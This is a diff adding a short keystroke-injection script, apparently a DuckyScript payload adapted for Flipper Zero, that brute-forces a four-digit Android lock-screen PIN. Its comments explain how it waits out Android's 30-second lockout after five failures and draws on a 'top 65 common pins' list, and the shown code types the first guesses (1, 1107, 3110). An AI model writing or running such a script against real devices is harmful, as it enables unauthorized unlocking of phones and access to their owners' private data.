@@ -1,0 +1,21 @@
+REM Android Password Brute Force - 4 digit pin
+REM Every 5th attempt the retry waits to work around the 30s timeout Android implements after 5 failed login attempts
+REM Uncomment bottom of script for DOB options
+REM Average completion time of script is 12m
+REM An exhaustive wordlist is not used because A) it is not assumed device has healthy battery B) time/power constraints of healthy battery
+REM Tested on Android 4.4
+REM Author: defplex.wordpress.com
+REM Modified for Flipper Zero by Filipek
+REM ***USE AT OWN RISK***
+
+REM top 65 common pins
+
+DELAY 1000
+STRING 1
+ENTER
+DELAY 1000
+STRING 1107
+ENTER
+DELAY 1000
+STRING 3110
+ENTER
